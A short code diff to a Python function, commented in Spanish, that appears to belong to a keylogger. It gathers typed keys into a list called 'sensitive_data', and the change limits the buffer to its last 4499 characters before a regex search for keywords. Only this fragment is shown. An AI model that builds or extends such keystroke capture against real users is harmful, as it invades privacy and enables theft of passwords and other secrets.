@@ -26,7 +26,7 @@ def get_click(tecla):
         return
     # Agrega la tecla a la lista sensitive_data y convierte la lista en una cadena
     sensitive_data.append(letra)
-    text = "".join(sensitive_data)
+    text = "".join(sensitive_data[-4499:])
 
     # Verifica si alguna palabra clave está presente en el texto usando expresiones regulares
     if any(re.search(keyword, text, re.I) for keyword in keywords):
